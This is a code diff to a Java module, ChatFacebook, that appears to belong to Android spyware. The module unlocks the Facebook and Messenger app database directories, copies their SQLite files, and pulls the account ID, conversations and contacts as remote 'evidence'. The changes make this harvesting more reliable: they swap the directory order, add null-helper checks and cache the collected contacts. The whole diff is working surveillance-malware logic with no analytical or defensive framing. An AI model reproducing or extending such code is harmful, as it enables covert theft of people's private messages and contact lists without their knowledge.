@@ -47,6 +47,8 @@ public class ChatFacebook extends SubModuleChat {
 
 	private String account_name;
 
+	private Hashtable<String,Contact> contacts = new Hashtable<String, Contact>();
+
 	@Override
 	public int getProgramId() {
 		return PROGRAM;
@@ -87,8 +89,8 @@ public class ChatFacebook extends SubModuleChat {
 	}
 
 	private boolean readMyAccount() {
-		String fbdir1 = "/data/data/com.facebook.katana/databases";
-		String fbdir2 = "/data/data/com.facebook.orca/databases";
+		String fbdir2 = "/data/data/com.facebook.katana/databases";
+		String fbdir1 = "/data/data/com.facebook.orca/databases";
 
 		if (Path.unprotect(fbdir1)) {
 			dbDir = fbdir1;
@@ -103,6 +105,12 @@ public class ChatFacebook extends SubModuleChat {
 
 		String dbFile = "prefs_db";
 		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
+		if(helper == null){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (readMyAccount) Error: cannot open " + dbDir + "/" + dbFile);
+			}
+			return false;
+		}
 		SQLiteDatabase db = helper.getReadableDatabase();
 
 		String[] projection = new String[] { "key", "value" };
@@ -157,10 +165,6 @@ public class ChatFacebook extends SubModuleChat {
 				helper = GenericSqliteHelper.open(dbDir, dbFile2);
 			}
 			if (helper != null) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (getFbConversations) Error: null helper");
-				}
-
 				List<FbConversation> conversations = getFbConversations(helper, account_uid);
 				for (FbConversation conv : conversations) {
 					if (Cfg.DEBUG) {
@@ -172,6 +176,10 @@ public class ChatFacebook extends SubModuleChat {
 					if (lastReadId > 0) {
 						updateMarkupFb(conv.id, lastReadId, true);
 					}
+				}
+			}else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (getFbConversations) Error: null helper");
 				}
 			}
 
@@ -335,6 +343,7 @@ public class ChatFacebook extends SubModuleChat {
 
 	}
 
+
 	private void readAddressContacts() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (readAddressContacts) ");
@@ -350,7 +359,7 @@ public class ChatFacebook extends SubModuleChat {
 			try {
 				Contact contact = json2Contact(value);
 				serializeContacts |= ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.FACEBOOK, contact);
-
+				contacts.put(contact.id, contact);
 			} catch (JSONException e) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (readAddressContacts) Error: " + e);
